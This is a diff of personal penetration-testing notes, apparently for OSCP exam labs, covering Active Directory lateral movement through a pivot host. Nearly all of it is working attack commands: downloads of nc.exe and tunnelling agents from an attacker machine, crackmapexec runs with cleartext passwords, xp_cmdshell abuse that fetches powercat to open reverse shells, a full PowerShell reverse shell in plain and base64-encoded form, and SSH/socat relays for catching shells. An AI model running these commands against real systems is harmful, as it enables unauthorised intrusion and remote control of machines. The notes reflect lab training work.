@@ -300,7 +300,8 @@ iwr -uri http://192.168.45.234/nc.exe -Outfile nc.exe
 
 AD lateral movement from .147
 ```
-ssh web_svc@192.168.190.147
+# Diamond1
+ssh web_svc@192.168.220.147
 
 # from kali
 sudo ip tuntap add user kali mode tun ligolo
@@ -311,7 +312,7 @@ sudo ip link set ligolo up
 >> start
 
 # add route to internal network
-sudo ip route add 10.10.80.0/24 dev ligolo
+sudo ip route add 10.10.110.0/24 dev ligolo
 
 # from windows target
 iwr -uri http://192.168.45.234/agent.exe -Outfile agent.exe
@@ -340,6 +341,7 @@ crackmapexec smb --exec-method mmcexec -u sql_svc -p 'Dolphin1' -X "whoami" 10.1
 crackmapexec mssql -d oscp.exam -u sql_svc -p 'Dolphin1' -X "whoami" 10.10.80.148
 cme mssql 10.10.123.X -u sql_svc -p passwd -d oscp.exam --get-file "C:\windows.old\windows\system32\SYSTEM" SYSTEM
 # mssql reverse shell https://rioasmara.com/2020/05/30/impacket-mssqlclient-reverse-shell/
+
 impacket-mssqlclient sql_svc:Dolphin1@10.10.80.148 -windows-auth
 enable_xp_cmdshell
 xp_cmdshell powershell IEX(New-Object System.Net.WebClient).DownloadString(\"http://192.168.190.147:80/powercat.ps1\");powercat -c 192.168.45.234 -p 1234 -e cmd
@@ -355,9 +357,32 @@ xp_cmdshell powershell IEX(New-Object System.Net.WebClient).DownloadString(\"htt
 xp_cmdshell powershell $client = New-Object System.Net.Sockets.TCPClient("192.168.45.234",1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 
 
-
 select * from INFORMATION_SCHEMA.COLUMNS where TABLE_NAME=master
 xp_cmdshell powershell whoami /priv
 xp_cmdshell powershell -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMwA0ACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
 
+```
+2. First approach would be to try accessing your kali from the machine. i) On your kali start http server using proxychains : proxychains python3 -m http.server 80 ii) On the machine try retrieving something from your kali http server. If the above approach doesn't work due to firewall. Then you may do the following:
+    
+    - Let's say you've owned MACHINE01 which was able to reach to your kali. This machine allows you to reach to the internal network. You setup pivot through this machine to access MACHINE02.
+    - Now you want to catch a shell but MACHINE02 can't reach back to your KALI but it can reach MACHINE01.
+    - So why not forward port from your KALI (port 4444) to MACHINE01.
+    - So now if you were to send a reverse shell from MACHINE02 to MACHINE01 port 4444 you'll get a shell back on your kali.
+    
+    NOTE: Make sure to use the right network interface IP address when trying to reach from MACHINE02 to MACHINE01. The subnet of both the machine IPs should be same. (edited)
+    
+```
+# listening socket then forwarding socket, then ssh server
+ssh -N -R 127.0.0.1:4444:10.10.110.148:445 web_svc@10.10.110.147
+
+ssh -N -R 4444:127.0.0.1:4444 web_svc@192.168.220.147
+socat -ddd TCP-LISTEN:4444,fork TCP:192.168.220.147:4444
+
+
+enable_xp_cmdshell
+xp_cmdshell powershell IEX(New-Object System.Net.WebClient).DownloadString(\"http://10.10.110.147:4444/powercat.ps1\");powercat -c 10.10.110.147 -p 4444 -e cmd
+```
+
+```
+socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432
 ```
